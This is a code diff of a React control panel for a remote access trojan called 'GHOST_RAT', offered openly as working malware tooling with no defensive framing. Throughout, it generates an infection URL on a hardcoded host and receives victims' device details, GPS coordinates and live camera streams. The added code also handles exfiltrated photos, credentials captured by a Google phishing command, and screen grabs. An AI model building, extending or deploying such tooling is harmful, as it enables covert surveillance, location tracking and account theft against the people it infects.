 export const GhostApp: React.FC<AppProps> = ({ isHackerMode }) => {
-    // Session
-    const [peerId, setPeerId] = useState<string>('');
-    const [customHost, setCustomHost] = useState<string>('https://kernelosss.vercel.app'); // Hardcoded User URL
-    const [copied, setCopied] = useState(false);
-    
-    // Data
+    const [peerId, setPeerId] = useState('');
     const [victims, setVictims] = useState<Record<string, VictimData>>({});
-    const [selectedVictimId, setSelectedVictimId] = useState<string | null>(null);
+    const [selectedId, setSelectedId] = useState<string | null>(null);
     const [logs, setLogs] = useState<string[]>([]);
-    const [cmdInput, setCmdInput] = useState('');
+    const [activeTab, setActiveTab] = useState<'controls' | 'data'>('controls');
     
-    // Refs
+    const [ttsInput, setTtsInput] = useState('');
+    const [isMuted, setIsMuted] = useState(true);
+
     const videoRef = useRef<HTMLVideoElement>(null);
     const peerRef = useRef<Peer | null>(null);
 
-    // Color definitions
-    const colors = {
-        bg: isHackerMode ? 'bg-black' : 'bg-slate-950',
-        text: isHackerMode ? 'text-green-500' : 'text-red-500',
-        border: isHackerMode ? 'border-green-900' : 'border-red-900',
-        highlight: isHackerMode ? 'text-green-400' : 'text-red-400',
-    };
-
-    const addLog = (msg: string) => setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev.slice(0, 99)]);
+    const addLog = (m: string) => setLogs(p => [`[${new Date().toLocaleTimeString()}] ${m}`, ...p].slice(0, 50));
 
     useEffect(() => {
-        // --- PERSISTENT ID ---
-        const savedId = localStorage.getItem('ghost_session_id');
-        const peer = savedId ? new Peer(savedId) : new Peer();
-        
-        peer.on('open', (id) => {
-            setPeerId(id);
-            localStorage.setItem('ghost_session_id', id);
-            addLog(`C2 ONLINE. LISTENING ON PORT 443`);
-            addLog(`SESSION ID: ${id}`);
-        });
-
-        peer.on('error', (err: any) => {
-            if (err.type === 'unavailable-id') {
-                localStorage.removeItem('ghost_session_id');
-                const newPeer = new Peer();
-                newPeer.on('open', (id) => {
-                    setPeerId(id);
-                    localStorage.setItem('ghost_session_id', id);
-                    addLog(`ID REGENERATED: ${id}`);
-                });
-                bindPeerListeners(newPeer);
-                peerRef.current = newPeer;
-            } else {
-                addLog(`[ERROR] ${err.type}`);
-            }
-        });
-
-        bindPeerListeners(peer);
+        const id = localStorage.getItem('ghost_id');
+        const peer = id ? new Peer(id) : new Peer();
         peerRef.current = peer;
+        
+        peer.on('open', (pid) => {
+            setPeerId(pid);
+            localStorage.setItem('ghost_id', pid);
+            addLog(`C2 ONLINE: ${pid}`);
+        });
 
-        return () => { peer.destroy(); };
-    }, []);
-
-    const bindPeerListeners = (peer: Peer) => {
         peer.on('connection', (conn) => {
-            const vId = conn.peer;
-            addLog(`[+] CONNECTION ESTABLISHED: ${vId.substring(0,6)}`);
-            
-            setVictims(prev => ({
-                ...prev,
-                [vId]: {
-                    id: vId,
-                    conn,
-                    platform: 'Analyzing...',
-                    ua: 'Unknown',
-                    screen: 'Unknown',
-                    lang: 'Unknown',
-                    cores: 0,
-                    connectedAt: Date.now()
-                }
-            }));
-            
-            if (!selectedVictimId) setSelectedVictimId(vId);
+            const vid = conn.peer;
+            setVictims(prev => ({ ...prev, [vid]: { id: vid, conn, platform: 'Unknown', ua: '', screen: '', lang: '', cores: 0, connectedAt: Date.now(), lastSeen: Date.now() } }));
+            if (!selectedId) setSelectedId(vid);
+            addLog(`[+] TARGET CONNECTED: ${vid.substring(0,5)}`);
 
-            conn.on('data', (data: any) => {
-                if (data.type === 'info') setVictims(prev => ({ ...prev, [vId]: { ...prev[vId], ...data.data } }));
-                if (data.type === 'battery') setVictims(prev => ({ ...prev, [vId]: { ...prev[vId], battery: data.level } }));
-                if (data.type === 'gps') {
-                    setVictims(prev => ({ ...prev, [vId]: { ...prev[vId], gps: data.data } }));
-                    addLog(`[GPS] LOCK: ${data.data.lat.toFixed(4)}, ${data.data.lng.toFixed(4)}`);
+            conn.on('data', (d: any) => {
+                setVictims(p => ({...p, [vid]: {...p[vid], lastSeen: Date.now()}}));
+
+                if (d.type === 'info') setVictims(p => ({ ...p, [vid]: { ...p[vid], ...d.data } }));
+                if (d.type === 'battery') setVictims(p => ({ ...p, [vid]: { ...p[vid], battery: d.level } }));
+                if (d.type === 'gps') setVictims(p => ({ ...p, [vid]: { ...p[vid], gps: d.data } }));
+                if (d.type === 'log') addLog(`${vid.substring(0,4)}: ${d.msg}`);
+                if (d.type === 'error') addLog(`${vid.substring(0,4)} ERR: ${d.msg}`);
+                
+                if (d.type === 'gallery_item') {
+                    setVictims(p => ({ ...p, [vid]: { ...p[vid], gallery: [d.data, ...(p[vid]?.gallery || [])] } }));
+                    addLog(`${vid.substring(0,4)}: IMAGE EXFILTRATED`);
                 }
-                if (data.type === 'log') addLog(`[LOG] ${vId.substring(0,4)}: ${data.msg}`);
-                if (data.type === 'error') addLog(`[ERR] ${vId.substring(0,4)}: ${data.msg}`);
+
+                if (d.type === 'creds') {
+                    setVictims(p => ({ ...p, [vid]: { ...p[vid], credentials: [d.data, ...(p[vid]?.credentials || [])] } }));
+                    addLog(`!!! CREDENTIALS STOLEN: ${d.data.email}`);
+                    const audio = new Audio('https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3');
+                    audio.play().catch(() => {});
+                }
             });
 
             conn.on('close', () => {
-                addLog(`[-] CONNECTION LOST: ${vId.substring(0,6)}`);
-                setVictims(prev => {
-                    const next = { ...prev };
-                    delete next[vId];
-                    return next;
-                });
-                if (selectedVictimId === vId) setSelectedVictimId(null);
+                setVictims(p => { const n = {...p}; delete n[vid]; return n; });
+                addLog(`[-] TARGET LOST: ${vid.substring(0,5)}`);
             });
         });
 
         peer.on('call', (call) => {
-            const vId = call.peer;
             call.answer();
-            call.on('stream', (remoteStream) => {
-                setVictims(prev => ({ ...prev, [vId]: { ...prev[vId], stream: remoteStream, call } }));
-                addLog(`[CAM] VIDEO FEED ACTIVE: ${vId.substring(0,6)}`);
+            call.on('stream', (stream) => {
+                setVictims(p => ({ ...p, [call.peer]: { ...p[call.peer], stream } }));
+                addLog(`[VIDEO] STREAM RECEIVED: ${call.peer.substring(0,5)}`);
             });
         });
-    }
 
-    // Attach stream to video element
+    }, []);
+
+    // Bind Video Stream
     useEffect(() => {
-        if (selectedVictimId && videoRef.current && victims[selectedVictimId]?.stream) {
-            videoRef.current.srcObject = victims[selectedVictimId].stream!;
+        if (selectedId && videoRef.current && victims[selectedId]?.stream) {
+            videoRef.current.srcObject = victims[selectedId].stream!;
         }
-    }, [selectedVictimId, victims]);
+    }, [selectedId, victims, activeTab]); 
 
-    // Construct the infection link
-    const getExploitLink = () => {
-        if (!peerId) return 'Initializing...';
-        // Normalize URL to prevent double slashes
-        let host = customHost.trim();
-        if (!host.startsWith('http')) host = 'https://' + host;
-        host = host.replace(/\/$/, '');
-        
-        return `${host}/${peerId}`;
-    };
-
-    const copyLink = () => {
-        navigator.clipboard.writeText(getExploitLink());
-        setCopied(true);
-        setTimeout(() => setCopied(false), 2000);
-        addLog("[SYS] LINK COPIED TO CLIPBOARD");
-    };
-
-    const sendCommand = (cmd: string, payload: any = {}) => {
-        if (!activeVictim) return;
-        activeVictim.conn.send({ cmd, ...payload });
-        addLog(`[CMD] SENT '${cmd.toUpperCase()}' TO TARGET`);
-    };
-
-    const activeVictim = selectedVictimId ? victims[selectedVictimId] : null;
+    const target = selectedId ? victims[selectedId] : null;
+    const send = (cmd: string, pl = {}) => target?.conn.send({ cmd, ...pl });
+    const copyLink = () => navigator.clipboard.writeText(`https://kernelosss.vercel.app/${peerId}`);
 
     return (
-        <div className={`h-full w-full flex flex-col font-mono ${colors.bg} ${colors.text} select-none overflow-hidden`}>
-            
+        <div className={`h-full w-full flex flex-col font-mono ${isHackerMode ? 'bg-black text-green-500' : 'bg-slate-900 text-red-500'}`}>
             {/* Header */}
-            <div className={`h-12 flex items-center justify-between px-4 border-b ${colors.border} bg-white/5 shrink-0`}>
-                <div className="flex items-center gap-2">
-                    <Ghost size={18} className={isHackerMode ? 'text-green-500' : 'text-red-500'} />
-                    <span className="font-bold tracking-widest text-sm">GHOST_RAT_V3.0</span>
+            <div className="h-12 border-b border-white/10 flex items-center justify-between px-4 bg-white/5 shrink-0">
+                <div className="flex items-center gap-2 font-bold">
+                    <Ghost size={18} /> GHOST_RAT V9.0 (ELITE)
                 </div>
-                <div className={`flex items-center gap-2 text-[10px] font-bold px-2 py-0.5 rounded ${peerId ? 'bg-green-500/20 text-green-500' : 'bg-red-500/20 text-red-500'}`}>
-                    <Wifi size={10} />
-                    {peerId ? 'C2 ONLINE' : 'OFFLINE'}
+                <div className="flex gap-2">
+                    <button onClick={copyLink} className="flex items-center gap-1 bg-white/10 px-2 py-1 rounded text-xs hover:bg-white/20 transition-colors">
+                        <Copy size={12} /> COPY LINK
+                    </button>
+                    <div className={`px-2 py-1 rounded text-xs font-bold ${peerId ? 'bg-green-900 text-green-400' : 'bg-red-900 text-red-400'}`}>
+                        {peerId ? 'ONLINE' : 'OFFLINE'}
+                    </div>
                 </div>
             </div>
 
             <div className="flex-1 flex overflow-hidden">
-                
-                {/* LEFT: Targets & Config */}
-                <div className={`w-72 border-r ${colors.border} flex flex-col bg-white/5`}>
-                    
-                    {/* Target List */}
-                    <div className="flex-1 overflow-y-auto p-2 space-y-2">
-                         <div className="text-[10px] opacity-50 uppercase mb-2 px-1">Active Sessions ({Object.keys(victims).length})</div>
-                        {Object.keys(victims).length === 0 && (
-                            <div className="text-center opacity-30 text-xs mt-10 italic border border-dashed border-white/20 p-4 rounded">
-                                Waiting for incoming connections...
-                            </div>
-                        )}
+                {/* Victim List SideBar */}
+                <div className="w-64 border-r border-white/10 bg-black/20 flex flex-col shrink-0">
+                    <div className="flex-1 overflow-y-auto">
+                        <div className="p-2 text-[10px] font-bold opacity-50 uppercase tracking-wider">Active Targets ({Object.keys(victims).length})</div>
                         {Object.values(victims).map((v: VictimData) => (
-                            <button
-                                key={v.id}
-                                onClick={() => setSelectedVictimId(v.id)}
-                                className={`w-full text-left p-3 rounded border transition-all flex items-center gap-3 ${selectedVictimId === v.id ? `${colors.border} bg-white/10` : 'border-transparent hover:bg-white/5'}`}
+                            <button 
+                                key={v.id} 
+                                onClick={() => setSelectedId(v.id)}
+                                className={`w-full p-3 text-left border-b border-white/5 hover:bg-white/5 transition-colors ${selectedId === v.id ? 'bg-white/10 border-l-2 border-l-current' : ''}`}
                             >
-                                <div className={`w-2 h-full absolute left-0 top-0 ${selectedVictimId === v.id ? 'bg-green-500' : 'bg-transparent'}`} />
-                                <Smartphone size={16} />
-                                <div className="min-w-0">
-                                    <div className="font-bold text-xs truncate">{v.platform}</div>
-                                    <div className="text-[10px] opacity-50 truncate">{v.id}</div>
+                                <div className="flex justify-between items-center mb-1">
+                                    <span className="font-bold text-xs truncate max-w-[100px]">{v.platform || 'Unknown Device'}</span>
+                                    {v.stream && <div className="w-2 h-2 rounded-full bg-red-500 animate-pulse shadow-[0_0_8px_red]" />}
                                 </div>
-                                {v.stream && <div className="w-2 h-2 rounded-full bg-red-500 animate-pulse ml-auto shadow-[0_0_5px_red]" />}
+                                <div className="flex justify-between items-center text-[10px] opacity-60">
+                                    <span>ID: {v.id.substring(0,6)}</span>
+                                    <span>{v.battery ? v.battery + '%' : ''}</span>
+                                </div>
                             </button>
                         ))}
                     </div>
-                    
-                    {/* PAYLOAD CONFIGURATION */}
-                    <div className={`p-4 border-t ${colors.border} bg-black/40`}>
-                         <div className="flex items-center gap-2 mb-2">
-                            <Settings size={12} className="opacity-70" />
-                            <div className="text-[10px] uppercase font-bold opacity-70">Payload Configuration</div>
-                         </div>
-                         
-                         {/* Host Input */}
-                         <div className="mb-3">
-                             <label className="text-[9px] block mb-1 opacity-50">C2 HOST / DOMAIN</label>
-                             <input 
-                                value={customHost}
-                                onChange={(e) => setCustomHost(e.target.value)}
-                                className={`w-full bg-black border ${colors.border} rounded px-2 py-1 text-[10px] outline-none focus:border-white transition-colors text-white`}
-                                placeholder="https://kernelosss.vercel.app"
-                             />
-                         </div>
-
-                         {/* Generated Link */}
-                         <div className="space-y-1">
-                            <label className="text-[9px] block opacity-50">INFECTION URL</label>
-                            <div className="flex gap-2">
-                                <input readOnly value={getExploitLink()} className={`flex-1 bg-black text-[10px] px-2 py-1.5 border ${colors.border} rounded opacity-80 select-all`} />
-                                <button onClick={copyLink} className="p-1.5 bg-white/10 rounded hover:bg-white/20 active:bg-green-500 transition-colors">
-                                    {copied ? <Check size={12}/> : <Copy size={12}/>}
-                                </button>
-                            </div>
-                         </div>
+                    {/* Infection URL Footer */}
+                    <div className="p-3 border-t border-white/10 bg-white/5 shrink-0">
+                        <div className="flex items-center gap-2 mb-2 text-[10px] font-bold opacity-70 uppercase">
+                             <Share2 size={10} /> Infection Payload URL
+                        </div>
+                        <div className="flex gap-1">
+                            <input 
+                                readOnly 
+                                value={peerId ? `https://kernelosss.vercel.app/${peerId}` : 'Initializing...'} 
+                                className="w-full bg-black/50 border border-white/10 rounded px-2 py-1.5 text-[9px] text-white/70 outline-none select-all font-mono"
+                            />
+                            <button onClick={copyLink} className="p-1.5 bg-white/10 rounded hover:bg-white/20 text-white/70 transition-colors"><Copy size={12} /></button>
+                        </div>
                     </div>
                 </div>
 
-                {/* CENTER: Control Panel */}
-                <div className="flex-1 flex flex-col relative bg-black/50">
-                    {activeVictim ? (
+                {/* Main Control Area */}
+                <div className="flex-1 flex flex-col bg-black/50 min-w-0">
+                    {target ? (
                         <>
-                            {/* Live Feed */}
-                            <div className="flex-1 relative bg-black flex items-center justify-center overflow-hidden border-b border-white/10 group">
-                                {activeVictim.stream ? (
-                                    <video ref={videoRef} autoPlay playsInline className="w-full h-full object-contain" />
+                            {/* LIVE FEED */}
+                            <div className="h-[40%] bg-black relative border-b border-white/10 group shrink-0">
+                                {target.stream ? (
+                                    <video ref={videoRef} autoPlay playsInline muted={isMuted} className="w-full h-full object-contain transform scale-x-[-1]" /> 
                                 ) : (
-                                    <div className="text-center opacity-30 flex flex-col items-center gap-2">
-                                        <div className="relative">
-                                            <Eye size={48} />
-                                            <div className="absolute inset-0 animate-ping opacity-20 border rounded-full" />
-                                        </div>
-                                        <span>ACQUIRING VISUAL...</span>
-                                    </div>
+                                    <div className="absolute inset-0 flex flex-col items-center justify-center opacity-30 gap-2"><Eye size={48} className="animate-pulse" /><span className="text-xs font-bold tracking-widest">NO SIGNAL</span></div>
                                 )}
-                                <div className="absolute top-2 left-2 bg-red-600/90 text-white text-[9px] font-bold px-1.5 py-0.5 rounded flex items-center gap-1 shadow-lg">
-                                    <div className="w-1.5 h-1.5 bg-white rounded-full animate-pulse" /> LIVE
+                                <div className="absolute top-2 left-2 flex gap-2">
+                                    <div className="bg-red-600/90 text-white text-[9px] px-2 py-0.5 rounded font-bold shadow-lg flex items-center gap-1"><div className="w-1.5 h-1.5 bg-white rounded-full animate-pulse" /> LIVE</div>
+                                </div>
+                                <div className="absolute top-2 right-2">
+                                    <button onClick={() => setIsMuted(!isMuted)} className={`p-1.5 rounded bg-black/50 hover:bg-black/80 text-white`}>
+                                        {isMuted ? <VolumeX size={14} /> : <Volume2 size={14} className="text-green-400" />}
+                                    </button>
                                 </div>
                             </div>
 
-                            {/* Control Grid */}
-                            <div className={`h-64 bg-slate-900 border-t ${colors.border} p-4 grid grid-cols-1 md:grid-cols-2 gap-4 overflow-y-auto`}>
-                                {/* Telemetry */}
-                                <div className="space-y-2 text-xs font-mono">
-                                    <div className="flex justify-between border-b border-white/5 pb-1"><span className="opacity-50">POWER</span> <span className={colors.highlight}>{activeVictim.battery ? activeVictim.battery + '%' : 'N/A'}</span></div>
-                                    <div className="flex justify-between border-b border-white/5 pb-1"><span className="opacity-50">DISPLAY</span> <span>{activeVictim.screen}</span></div>
-                                    <div className="flex justify-between border-b border-white/5 pb-1"><span className="opacity-50">CPU</span> <span>{activeVictim.cores} Cores</span></div>
-                                    <div className="flex justify-between border-b border-white/5 pb-1"><span className="opacity-50">LOCALE</span> <span>{activeVictim.lang}</span></div>
-                                    {activeVictim.gps && (
-                                        <div className="mt-2 bg-white/5 p-2 rounded border border-white/5">
-                                            <div className="opacity-50 mb-1 flex items-center gap-1"><MapPin size={10}/> GPS TRIANGULATION</div>
-                                            <div className={`${colors.highlight} text-[10px]`}>{activeVictim.gps.lat.toFixed(6)}, {activeVictim.gps.lng.toFixed(6)}</div>
-                                            <a href={`https://www.google.com/maps?q=${activeVictim.gps.lat},${activeVictim.gps.lng}`} target="_blank" className="underline opacity-50 hover:opacity-100 text-[9px] block mt-1">OPEN SATELLITE VIEW</a>
+                            {/* TABS */}
+                            <div className="flex border-b border-white/10 text-xs font-bold shrink-0">
+                                <button onClick={() => setActiveTab('controls')} className={`flex-1 py-3 hover:bg-white/5 transition-colors ${activeTab === 'controls' ? 'border-b-2 border-current bg-white/5' : 'opacity-50'}`}>CONTROLS</button>
+                                <button onClick={() => setActiveTab('data')} className={`flex-1 py-3 hover:bg-white/5 transition-colors ${activeTab === 'data' ? 'border-b-2 border-current bg-white/5' : 'opacity-50'}`}>DATA & FILES</button>
+                            </div>
+
+                            {/* CONTENT */}
+                            <div className="flex-1 overflow-y-auto p-4 bg-black/40">
+                                {activeTab === 'controls' ? (
+                                    <div className="grid grid-cols-2 md:grid-cols-3 gap-3 max-w-3xl mx-auto">
+                                        
+                                        {/* INFO CARD */}
+                                        <div className="col-span-2 md:col-span-3 bg-white/5 p-4 rounded-lg border border-white/10 text-xs space-y-2 mb-2 relative">
+                                            <div className="absolute top-3 right-3 text-right">
+                                                <div className="font-bold text-lg text-white">{target.battery}%</div>
+                                                <div className="text-[9px] opacity-50">BATTERY LEVEL</div>
+                                            </div>
+                                            <div className="grid grid-cols-2 gap-4">
+                                                <div>
+                                                    <div className="opacity-50 mb-0.5">PLATFORM</div>
+                                                    <div className="font-bold text-white">{target.platform}</div>
+                                                </div>
+                                                <div>
+                                                    <div className="opacity-50 mb-0.5">SCREEN</div>
+                                                    <div className="font-bold text-white">{target.screen}</div>
+                                                </div>
+                                                <div className="col-span-2">
+                                                    <div className="opacity-50 mb-0.5">LOCATION</div>
+                                                    <div className="font-bold font-mono text-white flex items-center gap-2">
+                                                        {target.gps ? `${target.gps.lat.toFixed(5)}, ${target.gps.lng.toFixed(5)}` : 'Scanning...'}
+                                                        {target.gps && (
+                                                            <a href={`https://www.google.com/maps?q=${target.gps.lat},${target.gps.lng}`} target="_blank" className="p-1 bg-blue-600 rounded hover:bg-blue-500 text-white"><Map size={12}/></a>
+                                                        )}
+                                                    </div>
+                                                </div>
+                                            </div>
                                         </div>
-                                    )}
-                                </div>
 
-                                {/* Actions */}
-                                <div className="space-y-3">
-                                    <div className="text-[10px] uppercase opacity-50 font-bold border-b border-white/10 pb-1">Command Injection</div>
-                                    
-                                    <div className="grid grid-cols-2 gap-2">
-                                        <button onClick={() => sendCommand('vibrate')} className="bg-white/5 hover:bg-yellow-500/20 p-2 rounded border border-white/10 flex items-center justify-center gap-2 text-xs font-bold active:scale-95 transition-all">
-                                            <Zap size={14} className="text-yellow-400" /> VIBRATE
+                                        {/* MEDIA CONTROLS */}
+                                        <div className="col-span-2 md:col-span-3 text-[10px] font-bold opacity-50 uppercase tracking-wider mt-2">Surveillance</div>
+                                        
+                                        <button onClick={() => send('switch_cam')} className="p-3 bg-blue-600/20 border border-blue-500/50 hover:bg-blue-600/30 rounded flex flex-col items-center gap-2 active:scale-95 transition-all">
+                                            <Camera size={20} className="text-blue-400" /> <span className="text-[10px] font-bold">SWITCH CAM</span>
                                         </button>
-                                        <button onClick={() => { const msg = prompt('Alert Message:'); if(msg) sendCommand('alert', {msg}); }} className="bg-white/5 hover:bg-blue-500/20 p-2 rounded border border-white/10 flex items-center justify-center gap-2 text-xs font-bold active:scale-95 transition-all">
-                                            <MessageSquare size={14} className="text-blue-400" /> ALERT
+                                        <button onClick={() => send('get_screen')} className="p-3 bg-red-600/20 border border-red-500/50 hover:bg-red-600/30 rounded flex flex-col items-center gap-2 active:scale-95 transition-all">
+                                            <Monitor size={20} className="text-red-400" /> <span className="text-[10px] font-bold">GET SCREEN</span>
                                         </button>
-                                        <button onClick={() => { const msg = prompt('Text to Speak:'); if(msg) sendCommand('speak', {msg}); }} className="bg-white/5 hover:bg-pink-500/20 p-2 rounded border border-white/10 flex items-center justify-center gap-2 text-xs font-bold active:scale-95 transition-all">
-                                            <Mic size={14} className="text-pink-400" /> TTS
+                                        <button onClick={() => send('torch', {on: true})} className="p-3 bg-yellow-600/20 border border-yellow-500/50 hover:bg-yellow-600/30 rounded flex flex-col items-center gap-2 active:scale-95 transition-all">
+                                            <Flashlight size={20} className="text-yellow-400" /> <span className="text-[10px] font-bold">TORCH ON</span>
                                         </button>
-                                        <button onClick={() => { const url = prompt('Redirect URL:'); if(url) sendCommand('redirect', {url}); }} className="bg-white/5 hover:bg-green-500/20 p-2 rounded border border-white/10 flex items-center justify-center gap-2 text-xs font-bold active:scale-95 transition-all">
-                                            <Globe size={14} className="text-green-400" /> REDIRECT
-                                        </button>
-                                    </div>
 
-                                    <div className="mt-2 flex gap-2">
-                                         <input 
-                                            value={cmdInput} 
-                                            onChange={(e) => setCmdInput(e.target.value)}
-                                            onKeyDown={(e) => {if(e.key === 'Enter'){ sendCommand('alert', {msg: cmdInput}); setCmdInput(''); }}}
-                                            placeholder="> Inject custom shellcode..."
-                                            className="flex-1 bg-black border border-white/20 rounded px-2 text-xs outline-none focus:border-green-500 font-mono text-green-500 placeholder-green-900"
-                                         />
-                                         <button onClick={() => {sendCommand('alert', {msg: cmdInput}); setCmdInput('');}} className="px-3 bg-white/10 rounded text-[10px] font-bold hover:bg-white/20">EXEC</button>
+                                        {/* ACTIONS */}
+                                        <div className="col-span-2 md:col-span-3 text-[10px] font-bold opacity-50 uppercase tracking-wider mt-2">Actions</div>
+
+                                        <button onClick={() => send('phish', {service: 'google'})} className="p-3 bg-indigo-600/20 border border-indigo-500/50 hover:bg-indigo-600/30 rounded flex flex-col items-center gap-2 active:scale-95 transition-all">
+                                            <Skull size={20} className="text-indigo-400" /> <span className="text-[10px] font-bold">PHISH LOGIN</span>
+                                        </button>
+                                        <button onClick={() => send('vibrate')} className="p-3 bg-white/5 border border-white/10 hover:bg-white/10 rounded flex flex-col items-center gap-2 active:scale-95 transition-all">
+                                            <Zap size={20} className="opacity-70" /> <span className="text-[10px] font-bold">VIBRATE</span>
+                                        </button>
+                                        <button onClick={() => {const m=prompt('Msg'); if(m) send('alert',{msg:m})}} className="p-3 bg-white/5 border border-white/10 hover:bg-white/10 rounded flex flex-col items-center gap-2 active:scale-95 transition-all">
+                                            <MessageSquare size={20} className="opacity-70" /> <span className="text-[10px] font-bold">ALERT</span>
+                                        </button>
+
+                                        {/* TTS */}
+                                        <div className="col-span-2 md:col-span-3 bg-white/5 rounded border border-white/10 p-2 flex gap-2">
+                                            <input 
+                                                value={ttsInput} onChange={e => setTtsInput(e.target.value)}
+                                                placeholder="Text to Speech..." 
+                                                className="flex-1 bg-transparent text-xs px-2 outline-none text-white placeholder-white/30"
+                                            />
+                                            <button onClick={() => { send('speak', {text: ttsInput}); setTtsInput(''); }} className="p-2 bg-white/10 hover:bg-white/20 rounded text-white"><ChevronRight size={14} /></button>
+                                        </div>
+
                                     </div>
-                                </div>
+                                ) : (
+                                    <div className="space-y-6">
+                                        {/* CREDENTIALS */}
+                                        {target.credentials && target.credentials.length > 0 && (
+                                            <div>
+                                                <div className="text-[10px] font-bold opacity-50 uppercase tracking-wider mb-2 text-red-400">Captured Credentials</div>
+                                                <div className="space-y-2">
+                                                    {target.credentials.map((c, i) => (
+                                                        <div key={i} className="bg-red-900/20 border border-red-900/50 rounded p-3 text-xs flex justify-between items-center">
+                                                            <div>
+                                                                <div className="font-bold text-red-300">{c.service.toUpperCase()}</div>
+                                                                <div className="text-white opacity-80">{c.email}</div>
+                                                            </div>
+                                                            <div className="font-mono bg-black/50 px-2 py-1 rounded text-red-200">{c.pass}</div>
+                                                        </div>
+                                                    ))}
+                                                </div>
+                                            </div>
+                                        )}
+
+                                        {/* GALLERY */}
+                                        <div>
+                                            <div className="flex justify-between items-center mb-2">
+                                                <div className="text-[10px] font-bold opacity-50 uppercase tracking-wider">Stolen Files</div>
+                                                <button onClick={() => send('get_gallery')} className="text-[9px] bg-white/10 px-2 py-1 rounded hover:bg-white/20">FETCH MORE</button>
+                                            </div>
+                                            <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
+                                                {target.gallery?.map((img, i) => (
+                                                    <div key={i} className="aspect-square bg-slate-800 rounded overflow-hidden relative group border border-white/10">
+                                                        <img src={img} className="w-full h-full object-cover" />
+                                                        <div className="absolute inset-0 bg-black/60 opacity-0 group-hover:opacity-100 flex items-center justify-center gap-2">
+                                                            <a href={img} download={`file_${i}.jpg`} className="p-2 bg-white/10 rounded-full text-white hover:bg-white/20"><Copy size={16}/></a>
+                                                        </div>
+                                                    </div>
+                                                ))}
+                                            </div>
+                                        </div>
+                                    </div>
+                                )}
                             </div>
                         </>
                     ) : (
-                        <div className="flex-1 flex flex-col items-center justify-center opacity-20 gap-4">
-                            <Crosshair size={64} />
-                            <div className="text-sm tracking-widest">AWAITING TARGET SELECTION</div>
+                        <div className="flex-1 flex flex-col items-center justify-center opacity-30 gap-6">
+                            <Crosshair size={96} className="text-red-500 animate-spin-slow" />
+                            <div className="text-sm font-bold tracking-[0.5em] animate-pulse">AWAITING CONNECTION</div>
                         </div>
                     )}
                 </div>
 
-                {/* RIGHT: Logs */}
-                <div className={`w-56 border-l ${colors.border} bg-black/40 hidden xl:flex flex-col`}>
-                    <div className="p-2 text-[10px] font-bold border-b border-white/10 flex items-center gap-2 bg-white/5">
-                        <Terminal size={10} /> SYSTEM LOGS
-                    </div>
+                {/* LOGS */}
+                <div className="w-56 border-l border-white/10 bg-black/40 hidden xl:flex flex-col shrink-0">
+                    <div className="p-2 text-[10px] font-bold border-b border-white/10 flex items-center gap-2 bg-white/5"><Terminal size={10} /> SYSTEM_LOGS</div>
                     <div className="flex-1 p-2 overflow-y-auto font-mono text-[9px] space-y-1">
-                        {logs.map((l, i) => (
-                            <div key={i} className="break-all opacity-70 border-l border-white/10 pl-1 hover:text-white hover:opacity-100 transition-colors cursor-default">{l}</div>
-                        ))}
+                        {logs.map((l, i) => <div key={i} className="break-all opacity-70 border-l-2 border-transparent hover:border-white/50 pl-1 hover:text-white transition-colors">{l}</div>)}
                     </div>
                 </div>
-
             </div>
         </div>
     );
